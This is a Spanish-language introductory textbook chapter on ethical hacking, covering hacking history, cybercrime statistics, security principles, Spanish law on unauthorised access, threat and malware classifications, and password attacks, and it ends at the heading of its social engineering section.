# Tema 1 Introducción al Hacking Ético

Esta primera unidad de trabajo sirve para introducir los conceptos generales de seguridad en los sistemas informáticos y la terminología propia de la ciberseguridad y el hacking ético. Además se explican los diferentes tipos de auditorías que se pueden llevar a cabo y los tipos de amenazas que pueden afectar a un sistema informático. Por último, se ofrecen consejos y recursos de aprendizaje que se pueden complementar con las enseñanzas de este libro para adquirir un nivel de dominio más elevado.

## Objetivos

- Identificar Las necesidades de la seguridad informática y valorar su importancia.
- Conocer los distintos tipos de auditorías de seguridad y su utilidad.
- Estudíar las fases de un Pentest (test de intrusión) y las metodologías elaboradas por diversos organismos.
- Realizar retos CTF para el autoaprendizaje como hacker ético.

## Contenido

- Un poco de historia
- Conceptos básicos
- Amenazas a la seguridad de la información
- Test de intrusión o pentest
- Cómo convertirse en Hacker (from zero to hero)
- Laboratorio de prácticas

## Un poco de historia

En inglés, un *hack* es una solución rápida e ingeniosa a un problema. Así, en los inicios de la computación, los estudíantes o ingenieros que trabajaban en los primeros desarrollos buscaban constantemente mejorar las soluciones a los problemas que se planteaban en esos inicios. Estos pioneros de la informática fueron los primeros *hackers*.

Poco a poco, con la evolución de la tecnología de la información y la comunicación, esos pioneros curiosos trataban de comprender los entresijos de esa incipiente tecnología, destriparla y ponerla patas arriba empleando esas ideas ingeniosas e incluso un poco locas. Eran los años en que para conectarse a Internet se empleaban líneas telefónicas extremadamente lentas y caras, mientras las universidades disponían de redes mucho más rápidas interconectadas entre sí con servidores con una enorme potencia de cálculo comparada con los ordenadores personales de la época. A finales de los años 60 y principios de los 70 del siglo XX nació el *phreaking*, que consiste en el pirateo de las comunicaciones telefónicas para realizar llamadas gratuitas o para conectarse a Internet de forma ilimitada.

Si bien estos primeros *hackers* estaban movidos por la curiosidad y las ansias de aprender y compartir conocimientos, sus acciones se consideraban ilegales por las grandes compañías telefónicas y corporaciones, por lo que debían moverse en entornos ocultos, chats y foros privados, naciendo así toda una subcultura *underground* donde los jóvenes se ocultaban detrás de seudónimos o *nicknames*. En muchos casos, estos grupos fueron detenidos y encarcelados y algunos de ellos, tras su salida de la cárcel, pasaron a trabajar para grandes corporaciones o fundaron sus propias compañías.

Uno de estos jóvenes apresado y encarcelado fue Loyd Blankednship, también conocido como *The Mentor*, miembro de la segúnda generación del grupo *Legion of Doom*. Tras su detención en 1986, publicó en la revista online *Phrack* el artículo *The Conscience of a Hacker*, más conocido como el *Manifiesto Hacker*, donde se exponen las motivaciones éticas de todo *hacker* y por qué sus acciones no debían considerarse ilegales.

Un extracto del manifiesto dice lo siguiente:

> *“… Sí, soy un delincuente. Mi delito es la curiosidad. Mi delito es juzgar a la gente por lo que dice y por lo que piensa, no por lo que parece. Mi delito es ser más inteligente que vosotros, algo que nunca me perdonaréis. Soy un hacker, y este es mi manifiesto. Podéis eliminar a algunos de nosotros, pero no a todos… Después de todo, somos todos iguales.”*

[Artículo original: *The Conscience of a Hacker*, de The Mentor (en inglés)](http://phrack.org/issues/7/3.html)

### Historia del hacking en España

Todo lo contado de forma muy breve en la sección anterior puede encontrarse de manera más extensa en el libro de Mercè Molist [*Historia del hacking en España. La historia nunca contada del underground hacker en la Península Ibérica*](https://hackstory.es).

![https://hackstory.net/skins/common/images/hackstory.es.jpg](https://hackstory.net/skins/common/images/hackstory.es.jpg)

En él se hace un repaso de los primeros grupos de *hackers* en España y sus acciones más relevantes, los magazines más importantes y los foros donde se publicaba y compartía la información de las últimas investigaciones sobre ingeniería social, *blue boxes*, virus, *crackers*, etc. También se añonda en las rivalidades y tensiones dentro de estos grupos que en muchos casos conducían a su división o disolución, y a guerras entre grupos que llevaban a pirateos y boicots entre ellos e incluso a denuncias que acababan con muchos de sus miembros en la cárcel. Una historia que merece la pena conocer y ser leída por cualquier persona que vaya a dedicarse a la ciberseguridad. El libro puede descargarse de manera gratuita y libre en diversos formatos desde su [página web](https://hackstory.es).

## Algunos hackers famosos

A lo largo de la historia hay numerosos ejemplos de *hackers* que se han hecho famosos por sus acciones. En este apartado se mencionan solo algunos de los más relevantes.

**John T. Drapper**, conocido por *Captain Crunch*, se hizo famoso por utilizar silbatos que se regalaban en cajas de cereales de la marca Cap’n Crunch para realizar llamadas telefónicas gratuitas. Drapper descubrió que las líneas telefónicas de AT&T utilizaban una señal con una frecuencia de 2600 Hz para liberar la línea; tras esta señal se podía marcar el número deseado consiguiendo llamar gratis. El silbato de juguete de la caja de cereales emitia una señal de esa misma frecuencia, asi que lo empleó con ese propósito. Posteriormente, Drapper trabajó para Apple en el diseño de un dispositivo para conectar el Apple Il a las lineas telefénicas. Su historia se puede leer en el libro [**Beyond the little blue box**](https://www.amazon.com/Beyond-Little-Blue-Box-Biographical/dp/152550570X/ref=sr_1_1?dib=eyJ2IjoiMSJ9.86Ek1LnBapvKMrzrdmk6D8dHEiIm6OCJCWWEPkQfZjL9N0v3iyhJLFvFq-k5o60x2CX9vukmHZrG4jrHCNRkrBW8mWaxptQym_-Lff1rECXK49YWLlezDIvQ5WNwcqd1Em-UY-sGUUwH3y-nE-j-I8QxCor2QDoixrtOpG5xvnhnnmcZ7YUAi3z08cMI_9iSAZHGGtvo8K5iQXyvSDdZUqWdxsqaBGiEL74oeIixLpY._0dahVOBpKYwHJOfyUleNafqdkXU2ozGmQFM90UiGDs&dib_tag=se&keywords=beyond+the+little+blue+box&qid=1728473828&sr=8-1), escrito por él mismo. Además, puede verse un vídeo de [s4vitar](https://www.youtube.com/@s4vitar) donde se recupera esta increíble historia.

**Vladimir Levin**, de origen ruso, es considerado el primer hacker en robar un banco a través de Internet. Accedió a los sistemas centrales de Citibank en Nueva York para hacer transferencias por valor de 10 millones de dólares. Cuando el banco se percató de las transferencias ilícitas lo denunció a la Interpol, que detuvo a Levi en 1995 en el aeropuerto de Heathrow.

**Kevin Poulsen**, conocido como Dark Dante, es un phreaker famoso por intervenir y manipular las llamadas de numerosos concursos telefónicos para ganarlos. Fue detenido por el FBI y condenado a varios años de prisión tras los cuales se dedicó al periodismo y a las noticias de seguridad informática. Trabajó para la
firma de ciberseguridad SecurityFocus, adquirida posteriormente por Symantec, y se convirtió en editor principal de la revista Wired.

**Kevin Mitnick** es, posiblemente, el hacker más famoso de la historia tras acceder a los sistemas de la NASA y del Departamento de Defensa de los Estados Unidos. Fundó la empresa Mitnick Security tras su salida de la cárcel y es autor de varios libros de lectura obligada: El Arte de la Intrusión (Ra-Ma, 2006) y El Arte de la
Invisibilidad (Anaya, 2.° Edicién, 2008). Su historia se ha llevado a la literatura y al cine en multitud de ocasiones, por ejemplo en la novela Takedown de Tsutomu Shimomura (1996) y en la película del mismo nombre en la versión original (Asalto Final en la versión en castellano, 2000).

### La ciberdelincuencia en la actualidad

La preocupación por la seguridad informática ha ido en aumento en los últimos años con el incremento de los ciberataques. Esta preocupación se ha agravado aún más tras la pandemia de COVID-19. Las estafas y los engaños a las personas y el robo de informatizan a empresas de cualquier tamaño estan a la orden
del día y son demasiado comunes. Basta con revisar la prensa para darse cuenta de la gravedad de algunos de estos ataques, que tienen como objetivo no solo pequeñas y medíanas empresas, sino también grandes corporaciones, multinacionales, organismos públicos, hospitales e incluso Estados. En la tabla 1.1 se puede observar cómo han evolucionado los diferentes tipos de ciberdelitos entre los años 2016 y 2021, así como el aumento notable en los fraudes informáticos, que se han multiplicado casi por siete en ese periodo.

Tabla 1.1. Estadísticas de ciberdelitos. (Fuente: [Observatorio Español de Delitos Informaticos](https://oedi.es/estadisticas/))

| TIPO DE CIBERDELITO | 2016 | 2017 | 2018 | 2019 | 2020 | 2021 |
| :----------------------: | ---: | ---: | ---: | ---: | ---: | --: |
| Fraude informático | 45894 | 60511 | 88760 | 192375 | 257907| 267011 |
|Amenazas y coacciones| 11473 |11270| 11906| 12782| 14066| 17319|
|Falsificación informática | 2697 |2961| 3095| 4275| 6289| 10476|
| Acceso e interceptación ilícita | 2579| 2505 |2750 |4004 |4653| 5342|
|Contra el honor |1524 |1537 |1423 | 1422| 1550| 1426|
| Delitos sexuales |1188|1312| 1393 |1774| 1783| 1628|
|Interferencia en los datos y en el sistema| 1110 | 1102 |1015|1473|1590|2138|
|Contra la propiedad intelectual/industrial |121|109|217|197|125|137|
|Contra la salud pública| 0| 0| 0| 0| 0| 0|
|TOTAL | 66586 | 81307 | 110603 | 218302 | 287963 |305477|

Un ejemplo reciente (octubre de 2021) es el hackeo de Twitch, la plataforma de streaming de video, cuando los hackers filtraron 125 GB de información donde se incluía el código fuente de la plataforma y datos económicos. Así, se hicieron públicos los ingresos de los streamers, como el de Ibai Llanos. Otro ejemplo es el ataque de ransomware al CSIC (Consejo Superior de Investigaciones Científicas) que se produjo en julio de 2022 y que pudo provenir de Rusia. En este caso, el ataque pudo detectarse a tiempo, ya que no se ha detectado pérdida o secuestro de información sensible.

Más grave aun es el ataque realizado con el software espía Pegasus a los teléfonos de miembros del Gobierno de España, entre ellos el Presidente y la Ministra de Defensa, que pudo suponer el robo de más de 2 GB de información sensible.

La lista de ataques es interminable y daría para cientos de páginas. Los ataques de ransomware son los más comunes dado que el cifrado de la información de los equipos informáticos de las empresas hace que se paralice toda la actividad de estas. Los delincuentes exigen el pago de una recompensa para poder
recuperar toda la información y amenazan con hacer públicos todos los datos si no se paga. A menudo, las empresas acaban pagando el rescate, lo que motiva aun más a los delincuentes para seguir actuando. El principal motivo por el que las empresas acaban pagando es que la mayoría de ellas no tienen planes de
seguridad adecuados y con la pérdida de toda su información se verían abocadas al cierre.

Otro aspecto de suma importancia es la proteccién que deben tener los datos almacenados por las empresas. La AEPD (Agencia Española de Protección de Datos) establece una serie de obligaciones y responsabilidades según el nivel de protección de los datos personales de los que dispongan las empresas, así como un procedimiento sancionador y multas que pueden ser millonarias si se demuestra que la información no ha estado suficientemente protegida. Según el díario online El Economista, las multas por protección de datos aumentaron en Europa un 521% en el año 2021 y habrían superado los [1000 millones de euros en sanciones]( https://www.eleconomista.es/legislacion/noticias/11559160/01/22/Las-multas-por-Proteccion-de-Datos-aumentan-un-521-durante-2021.htm).

Todo esto ha hecho que la demanda de profesionales formados en ciberseguridad también haya crecido enormemente, si bien no lo ha hecho al mismo ritmo que los delitos. Un factor determinante es que hay una falta de personal con titulaciones y experiencia suficiente con respecto a los perfiles que requieren las
empresas. Según el INCIBE (Instituto Nacional de Ciberseguridad), la demanda de talento en ciberseguridad doblará a la oferta en el año 2024, con una estimación de más de 83 000 profesionales necesarios (https://www.incibe.es/).

## Conceptos básicos

En este apartado se presentan los conceptos básicos relacionados con la seguridad de la información. El término seguridad lo entendemos como la ausencia de peligro, daño o riesgo, e información como el conjunto organizado de datos que constituye un mensaje.

Así pues, la seguridad de la información seria el conjunto de medidas de prevención, detección y corrección orientadas a proteger la confidencialidad, integridad y disponibilidad de la información. Estos tres aspectos de la información se conocen como principios de la seguridad de la información y se definen en detalle en el siguiente apartado.

Las medidas cuyo objetivo es proteger la información y los recursos de la organización se conocen como seguridad defensiva. Por contra, las técnicas y procedimientos que se emplean para lograr vulnerar los controles de seguridad y poner en riesgo alguno de los principios mencionados anteriormente se conocen como **seguridad ofensiva**. Es habitual que grandes empresas y entidades bancarias dispongan de equipos dedicados tanto a la seguridad defensiva como a la seguridad ofensiva (Apartado 1.4.5) que compiten entre sí en una especie de juego del ratón y el gato, que hacen que las medidas de seguridad sean puestas a prueba constantemente consiguiendo una mejora continua de su seguridad.

### Principios de la seguridad de la información

Desde el punto de vista de la información, se definen tres principios básicos para garantizar su seguridad:

- **Confidencialidad** (confidentiality). Se ocupa de garantizar que la información solo pueda ser conocida por las personas autorizadas. De este modo se evita que esta información sea divulgada de forma accidental o intencionada.
- **Integridad** (integrity). Esta característica posibilita que la información no pueda ser alterada 0 modificada sin permiso o de forma accidental. De este modo se garantiza la consistencia de la información.
- **Disponibilidad** (availability). Se garantiza que la información estaré accesible por un sistema o por usuarios autorizados a ello. De este modo se asegura que se tiene acceso inmedíato e ininterrumpido a la información.

Ademas, si se tiene en consideración que la información es compartida e intercambiada por distintos medios, se incluyen otros dos principios mas:

- **Autenticación** (authentication). Con este principio se debe garantizar la identidad del creador de la información, es decir, se conoce quién ha realizado el envío de la información. Se consigue usando factores de autenticación que pueden ser factores inherentes (por ejemplo, datos biométricos), algo que el usuario sabe (pin, usuario-constraseñá), o algo que el usuario tiene (una tarjeta RFID, un teléfono, una clave publico-privada, etc.). Se habla de múltiple factor de autenticación (multi-factor authentication) cuando se emplean varios de estos factores para autenticar a un usuario, que es el método más recomendado hoy en día.
- **No repudio** (non-repudiation). Con este principio, el emisor no puede negar que él ha enviado la información (no repudio de origen), o el receptor no puede negar que la información ha llegado al destino (no repudio de destino).

### Clasificación de las medidas de seguridad

Los principios de la seguridad de la información pueden garantizarse adoptando medidas de seguridad adecuadas. Estas medidas se pueden clasificar según diferentes criterios.

Atendiendo al momento de actuación existen estas medidas:

- **Seguridad activa**: son las medidas que tratan de prevenir algún daño en un sistema informático. Algunos ejemplos son el uso de controles de acceso, protocolos seguros o un cortafuegos.
- **Seguridad pasiva**: son las medidas que tratan de reparar o minimizar un daño que se ha producido en un sistema informático. Ejemplos de ellas son las copias de seguridad, los sistemas de discos redundantes (RAID) 0 los sistemas de alimentación ininterrumpida (SAI).

Una medida no tiene por qué ser exclusiva de una categoria; por ejemplo, las suites de seguridad modernas incluyen multitud de herramientas que permiten prevenir daño y repararlos en caso de que se produzcan.

Las medidas atendiendo al elemento que se protege son estas:

- **Seguridad física**: son aquellas medidas que tratan de proteger el hardware de los sistemas informáticos. Algunas de las amenazas más comunes no tienen por qué estar relacionadas con ataques malintencionados, como, por ejemplo, incendios, inundaciones, sobrecargas eléctricas, etc. Entre las amenazas a la seguridad física con malas intenciones se incluyen los robos 0 los
  accesos no autorizados a los centros de procesos de datos (CPD).
- **Seguridad lógica**: son las medidas que tratan de proteger el software y los datos de los sistemas informáticos. Las amenazas que pueden comprometer la seguridad lógica pueden ser intencionadas o no. Entre las amenazas más frecuentes están el malware, la pérdida de información o de su integridad (borrados fortuitos o malintencionados), los ataques para inhabilitar los servicios (como la denegación de servicio, o DoS), etc. En el Apartado 1.3 se describen con mayor profundidad.

### Hacking: definición y aspectos legales

Según la RAE, la palabra hacker o jaqueo tiene los siguientes significados:

- **Pirata informático**: persona que accede ilegalmente a sistemas informáticos
  ajenos para apropiárselos u obtener información secreta.
- **Persona con grandes habilidades en el manejo de computadoras** que inves-
  tiga un sistema informático para avisar de los fallos y desarrollar técnicas de
  mejora.

La segunda acepción fue introducida en la vigesimotercera edicion del diccionario, en el año 2017. Esta modificación se venía demandando desde hacia tiempo, ya que la definición primera suponía una visión meramente negativa de esos profesionales que investigan los principales fallos en el hardware o software y los reportan para que sean corregidos antes de que los delincuentes puedan emplearlos de forma maliciosa. Por tanto, es ésta la labor del hacker ético.

>jáquer
>Del ingl. hacker.
>
>  1. m. y 1. Inform. pirata informático.
>  2. Inform. Persona con grandes habilidades en el manejo de computadoras que investiga un sistema informático para avisar de los fallos y desarrollar técnicas de mejora.

Figura 1.2. Definición de la palabra [hacker por la RAE](https://dle.rae.es/j%C3%A1quer).

Una clasificación habitual de los tipos de hackers se suele realizar en función de
sus intenciones:

- **Hacker de sombrero blanco** (white hat hacker). Mejora la seguridad, encuentra agujeros en ella y notifica a la víctima para que tenga la oportunidad de arreglarlos. Es un profesional que suele ser contratado por una empresa u organización para que ataque sus propios sistemas buscando vulnerabilidades y fallos en ellos. En esta categoría entra el hacker ético.

- **Hacker de sombrero negro** (black hat hacker). Es un ciberdelincuente (aunque en la cultura popular se le conoce como hacker). Usa su conocimiento con fines negativos y, normalmente, egoístas: robo, extorsión, etcétera.
- **Hacker de sombrero gris** (gray hat hacker). Se trata de un hacker a medio camino entre un sombrero blanco y un sombrero negro. Se dan distintos casos:
  - **Hacktivistas**. Suelen asociarse en grupos y realizan acciones de hackeo con un propósito definido, normalmente altruista. Dicho propósito puede ser político, defensa de la libertad de expresión, de los derechos humanos, etc. Un ejemplo de este tipo de hackers sería el grupo **Anonymous**.
  - Aquellos que trabajan como sombrero blanco pero dejan alguna **puerta trasera** en el sistema para vender información a la competencia. 
  - Aquellos que realizan acciones propias de un sombrero negro, pero que persiguen o denuncian determinados tipos de delitos como la pederastia.


También se denomina **script kiddies** a personas sin los conocimientos y habilidades de un hacker, que tratan de atacar sistemas empleando herramientas creadas por verdaderos hackers. Pueden tener éxito ante configuraciones o problemas de seguridad muy obvios o sencillos, aunque no tengan ni idea de como lo han conseguido.

En España, el código penal establece los supuestos en los que un hacker podría estar cometiendo un delito. Son de interés los artículos comprendidos entre el 197 y el 201, especialmente el 197bis y el 197ter, que se incorporaron al código penal en el año 2015:

- **Artículo 197bis.1**. «El que por cualquier medio o procedimiento, vulnerando las medidas de seguridad establecidas para impedirlo, y sin estar debidamente autorizado, acceda o facilite a otro el acceso al conjunto o una parte de un sistema de información o se mantenga en él en contra de la voluntad de quien tenga el legítimo derecho a excluirlo, será castigado con pena de prisión de
  seis meses a dos años».
- **Artículo 197bis.2.** «El que mediante la utilización de artificios o instrumentos técnicos, y sin estar debidamente autorizado, intercepte transmisiones no públicas de datos informáticos que se produzcan desde, hacia o dentro de un sistema de información, incluidas las emisiones electromagnéticas de los mismos, sera castigado con una pena de prisión de tres meses a dos años o multa de tres a doce meses».
- **Artículo 197ter**. «Será castigado con una pena de prisión de seis meses a dos años o multa de tres a dieciocho meses el que, sin estar debidamente autorizado, produzca, adquiera para su uso, importe o, de cualquier modo, facilite a terceros, con la intención de facilitar la comisión de alguno de los delitos a que se refieren los apartados 1 y 2 del articulo 197 o el articulo 197 bis:
  - a) un programa informático, concebido o adaptado principalmente para cometer dichos delitos; o
  - b) una contraseña de ordenador, un código de acceso o datos similares que permitan acceder a la totalidad o a una parte de un sistema de información».

Por tanto, de lo anterior se deduce que es totalmente imprescindible tener la autorización correspondiente por medio de un contrato en donde se establezca claramente el propósito y ámbito de nuestra actividad. En caso de que se realice una investigación sobre un sistema informático sin tener dicha autorización, aunque no se haga un uso malintencionado de la información y se reporten las vulnerabilidades encontradas, se podría ser denunciado. Esto es lo que le ocurrió a un hacker que descubrió un fallo de seguridad grave en LexNET, el sistema informático que usa el Ministerio de Justicia; tras hacerlo publico fue denunciado por dicho Ministerio!

## Amenazas a la seguridad de la información

En seguridad de la información, una amenaza (**threat**) es cualquier suceso que atenta contra el buen funcionamiento del sistema y que puede afectar a nuestros activos. La norma UNE 71504:2008, que define la Metodologia de Analisis y Gestion de Riesgos para los Sistemas de Información (MAGERIT), define amenaza como:

«Causa potencial de un incidente que puede causar dafios a un sistema de información o a una organización».

Las amenazas pueden suceder de forma involuntaria, como puede ser un desastre natural, o de forma deliberada, [como por ejemplo un ataque DDoS](https://www.lasexta.com/tecnologia-tecnoxplora/internet/ministerio-justicia-denuncia-hacker-que-descubrio-fallo-lexnet_20170808598994980cf2c0f4137e4fd5.html). MAGERIT ([™ MAGERIT v.3: Metodología de Análisis y Gestión de Riesgos de los Sistemas de Información](https://administracionelectronica.gob.es/pae_Home/pae_Documentacion/pae_Metodolog/pae_Magerit.html)) establece los siguientes tipos de amenazas:

- **De origen natural**: accidentes naturales como terremotos, inundaciones, etcétera.

- **Del entorno** (de origen industrial): tales como cortes de suministro, contaminación, etcétera.
- **Defectos de las aplicaciones**: en esta clasificación entrarían las vulnerabilidades o los fallos de los sistemas por errores de diseño, etcétera.
- **Causadas por las personas de forma accidental**: las personas que cometen errores sin percatarse pueden causar dafios o facilitar información que puede ayudar a los atacantes. En esta categoría entraría la ingeniería social.
- **Causadas por las personas de forma deliberada**: son las amenazas que llevan a cabo atacantes de forma deliberada para obtener algún tipo de beneficio o causar daño en los activos.

En el ámbito de la seguridad ofensiva y el hacking ético interesa conocer las amenazas de las tres últimas categorías. En los siguientes subapartados se explican de forma más detallada.

### Tipos de intrusos y motivaciones

En un apartado anterior se definieron los tipos de hackers en función de sus intenciones. Existen otras denominaciones muy comunes que hacen referencia a los distintos tipos de intrusos o ciberdelincuentes según las motivaciones de sus actos, por lo que es interesante conocerlas.

- **Cracker**. Busca provocar danos y obtener beneficios de forma ilegal. El término esta ligado a los años 80 cuando la mayoría del software propietario disponía de licencias y sistemas anticopia que impedían su uso sin pagar. Utilizaban la ingeniería inversa para desarrollar keygens y cracks, los cuales servían para modificar el software original y evitar las restricciones.
- **Phreaker**. Busca acceder a Internet de forma gratuita a través de redes telefónicas. El término proviene de los años 60 cuando se iniciaban las primeras conexiones analógicas vía módem en los Estados Unidos. Estas acciones estaban motivadas por el elevado coste de estas conexiones telefónicas.
- **Spammer**. Se dedica al envío masivo de mensajes de correo electrónico con diversos objetivos, como la ganancia económica o el colapso de buzones y servidores de correo.
- **Lamer**. Trata de parecerse a un hacker pero tiene pocos conocimientos técnicos y no sabe lo que está haciendo (no entiende el código o los comandos que ejecuta, no conoce el funcionamiento técnico de las herramientas...) y se
  limita a copiar y pegar. También se conoce como wannabe o script-kiddie.
- **Insider**. Personal que trabaja dentro de la propia empresa y actúa contra ella por motivos económicos o por venganza.
- **Exempleado**. Antiguo trabajador, cuyas motivaciones son similares a las del insider.
- **Hacktivist**. Busca relevancia política con acciones de reivindicación contra las injusticias, la proteccién de los derechos humanos o del medioambiente, etc. Anonymous es un grupo vinculado a este tipo de acciones.
- **State-Sponsored hacker**. Ciberdelincuente que realiza sus acciones, normalmente criminales, bajo el paraguas de una nación o Estado. Sus ataques van dirigidos a otras naciones amigas o enemigas con el objetivo de conseguir
  información valiosa, colapsar sistemas informáticos o infraestructuras críticas del país como centrales nucleares, hospitales, etcétera.

### Códigos dañinos: malware

El malware (malicious software) es un programa informático que ha sido desarrollado para introducirse en un sistema y causar algún tipo de control o daño.
Los más frecuentes son el cifrado de la información, la pérdida de datos por su borrado o el espionaje de todas las acciones que se realizan desde el equipo o sistema.

Las técnicas de propagación del malware son muy diversas y de distinta sofisticación. Un vector común de propagacién son las tiendas de aplicaciones para móviles en donde a menudo se cuela una cantidad importante de aplicaciones maliciosas. El usuario se descarga una app y acepta todos los permisos de la misma sin cuestionarse si estos permisos son necesarios (por ejemplo, se debería sospechar al instalar una aplicación de linterna que pide permiso para leer los mensajes, acceder a la galería o a los contactos).

Otra técnica común es incluir el malware en un software que sabe que activará las alertas de un antivirus, como un activador de Windows, una versión pirata de Spotify, etc., y por ello el usuario obviará esa alerta. Una técnica un poco más sofisticada que puede ir en conjunción con ésta es realizar la descarga del código malicioso tras la ejecución del binario. Este binario analiza el sistema para comprobar las medidas de seguridad y tratar de deshabilitarlas antes de descargar el malware.

También es posible incluir el malware en un fichero comprimido con contraseña, de modo que los antivirus no podrán analizarlo. En el Apartado 6.2.2 se describe cómo es posible realizar esto. El malware también puede estar oculto en ficheros aparentemente legítimos como imágenes, vídeos, audios, etc., empleando esteganografía; esto se conoce como stegomalware. Al ejecutar alguno de estos ficheros, el malware oculto se reconstruye dinámicamente. Es recomendable visionar la charla de [Alfonso Muñoz stegomalware en APT modernos, técnicas y contramedidas](https://youtu.be/hGhufb2C_7Y) en las XIV Jornadas STIC del CCN-CERT para conocer más sobre esta técnica.

También conviene leer el libro Stegomalware. Evasión de antivirus y seguridad perimetral usando esteganografia, del mismo autor y disponible libremente en su repositorio de GitHub.

Otra técnica compleja y que cada vez es más utilizada es la conocida como [**fileless in-memory**](https://www.cybereason.com/blog/fileless-malware) malware. Este tipo de malware solo existe en la memoria en tiempo de ejecución, no se distribuye en ficheros ni se almacena en el disco duro del sistema, por lo que el análisis forense posterior es muy complicado.

#### Clasificación del malware

El malware se puede clasificar según su funcionamiento o el daño que produce.  Así, se pueden encontrar los siguientes tipos:

- **Exploit**. Este malware aprovecha las vulnerabilidades del software para comprometer el sistema. La acción maliciosa que realiza el exploit es lo que se conoce como *payload*.
- **Virus**. Este malware se caracteriza porque su código se acopla en un programa legitímo y cuando se ejecuta, el código dañino se replica en otros programas y ficheros del ordenador. Hay diferentes tipos de virus: del sector de
  arranque, de ficheros ejecutables, de lenguajes de macros (por ejemplo macros de MS Office), de lenguajes de script (.bat, bash scripting...).
- **Ransomware**. Una vez que infecta los sistemas, encripta la información relevante y solicita un rescate para recuperar la información. Es uno de los tipos de malware más presentes hoy en día por el enorme beneficio económico
  que reporta a los ciberdelincuentes. Las empresas y usuarios se ven, en muchos casos, obligados a pagar el rescate para continuar con su trabajo al no disponer de copias de seguridad o al haber sido estas destruidas o cifradas también. El rastreo de los delincuentes se hace prácticamente imposible puesto que los pagos se exigen en criptomonedas.
- **Spyware**. El nombre proviene de «software espía», por lo que su acción consiste en recopilar la actividad que realiza el usuario para enviarla al ciberdelincuente.
- **Adware**. Es un malware normalmente inocuo pero molesto, que consiste en mostrar anuncios y publicidad de forma constante. De esta forma los ciberdelincuentes obtienen beneficio económico.

- **Troyano**. Es un programa que se disfraza como funcional pero que una vez ejecutado sirve de puerta de entrada para que los ciberdelincuentes tomen el control del sistema.

- **Rootkit**. Este malware proporciona un método de acceso y control remoto total del equipo infectado pasando totalmente desapercibido.
- **Keylogger**. Es un malware que registra todas las teclas que se han pulsado en el sistema. El objetivo es descubrir información confidencial y valiosa, como contraseñas, cuentas bancarias, tarjetas de crédito, etcétera.

- **Gusano**. Su característica principal es que puede autopropagarse a través de las redes de ordenadores infectando a todos los equipos conectados.

- **Bacteria**. El objetivo de este malware es replicarse a si mismo para consumir la memoria del sistema infectado.
- **Bomba lógica**. Es un malware que permanece oculto en el sistema hasta que se cumplen las condiciones predefinidas para su activación.
- **Cryptojacking**. El propósito de este malware es el minado de criptomonedas. Aprovecha la potencia de calculo de los equipos para infectar la mayor cantidad posible de ellos y realizar la minería de criptomonedas con la que obtiene beneficio económico.

Estas categorias no son estancas y lo normal es que un determinado malware
tenga más de una de estas caracteristicas.

#### Breve historia del malware

En esta sección se muestran algunos de los eventos más relevantes de la historia del malware. No es un listado exhaustivo, pero cada uno de estos marcó un hito en la historia por la relevancia de su infección o por sus características, por
lo que es interesante conocerlos para aprender como ha sido su evolución.

- **Brain** (1986). Considerado el primer virus difundido fuera de un laboratorio. Desarrollado en Pakistan, infectaba el sector de arranque de los disquetes.
- **Stoned** (1987). Otro virus pionero, infectaba el sector de arranque del disco duro.
- **Jerusalem** (1987). También conocido como «Viernes 13» ya que se desencadenaba en esa fecha y borraba los ficheros que infectaba.
- **Gusano de Morris** (1988). Provocó que toda la red ARPANET colapsara ya que ralentizaba los ordenadores infectados y conectados a ella.
- **Michelangelo** (1992). Infectaba el sector de arranque de los disquetes y el MBR (Master Boot Record). Actuaba el 6 de marzo, el aniversario del nacimiento del pintor y escultor Miguel Angel.
- **Concept** (1995). Primer virus de macro de Office.
- **Laroux** y **AccesiV** (1998). Primeros virus de macro de Excel y Access respectivamente.

* **Strange Brew** (1998). Primer virus desarrollado en lenguaje Java.
* **Chernobyl** o **CIH** (1999). Virus que formateaba el disco duro y podía ocasionar daños en el hardware, ya que intentaba reescribir la BIOS del equipo.
* **Melissa** (marzo de 1999). Consiguió infectar 4 millones de ordenadores en 3 días. Se propagaba a través del correo electrónico.
* **Loveletter** o **I Love You** (mayo de 2000). Escrito en VBScript, infecto a 40 millones de ordenadores en tan solo 6 horas.
* **Stuxnet** (septiembre de 2010). Una de las primeras armas para la guerra cibernética. Infectaba sistemas y procesos críticos aprovechando hasta cuatro vulnerabilidades zero-day.
* **Wannacry** (mayo de 2017). Fue un ransomware que infecté unos 200 000 dispositivos en pocas horas. El ataque se detuvo gracias a la activación del interruptor de parada del malware, descubierto por Marcus Hutchins y que
  consistía en el registro de un dominio de Internet; mientras ese dominio no existiera, el malware debía seguir propagándose. Se sospecha que el ataque estaba dirigido desde Corea del Norte y aprovechaba un grave fallo de seguridad de los sistemas operativos Windows conocido como EternalBlue, descubierto meses antes, pero para el que muchos sistemas seguían sin aplicar el parche de seguridad correspondiente.

### Tipos de ataques

En este apartado se clasifican los tipos de ataques que se pueden encontrar en un sistema informático. En la [Guía de ciberataques del INCIBE](https://www.incibe.es/ciudadania/formacion/guias/guia-de-ciberataques) se distinguen los siguientes: ataques a contraseñas, ataques de ingeniería social, ataques a las
conexiones y ataques por malware.

En los siguientes subapartados se describe en profundidad cada uno de ellos, excepto los ataques por malware que ya se han mencionado anteriormente, y se incorporan otros dos tipos de ataques no contemplados en esta guía: los ataques a la cadena de suministro y los ataques invisibles en el código fuente.

#### Ataques a contraseñas

El objetivo de este ataque es obtener las credenciales de acceso a un sistema o servicio. Este ataque tiene una probabilidad de éxito mayor si se reutilizan credenciales o si las credenciales no son lo suficientemente complejas. Los ataques suelen usar la fuerza bruta (probar todas las posibles combinaciones), o diccionarios de contraseñas que se han recopilado y elaborado al analizar las contraseñas habituales obtenidas en leaks o hackeos de bases de datos de importantes corporaciones. En el Apartado 5.2 se explica como se lleva a cabo este tipo de ataque.

EI sitio web [Have I been pwned?](https://haveibeenpwned.com/) permite comprobar si una determinada cuenta de correo ha sido comprometida, y con ello la contraseña. Es un servicio interesante sobre todo si se tiene la misma contraseña para muchos servicios online (Apartado 2.4.5).

Como medida de protección ante los ataques a contraseñas se recomienda usar múltiples factores de autenticación, ademas de un gestor de contraseñas donde poder almacenar nuestros secretos de forma cómoda y segura. Existe una amplia gama de gestores de contraseñas con opciones y características variadas. De todos ellos, es recomendable [GuardedBox](https://guardedboox.es/), un gestor de contraseñas online desarrollado por la empresa española DinoSec, que permite almacenar y compartir secretos. Utiliza cifrado End-to-End (E2E), lo que significa que el servidor no tiene ningún tipo de información acerca de nuestros datos. El código está disponible en GitHub y la empresa ofrece una instancia pública con modalidad gratuita e instancias personales premium.

#### Ataques de ingeniería social

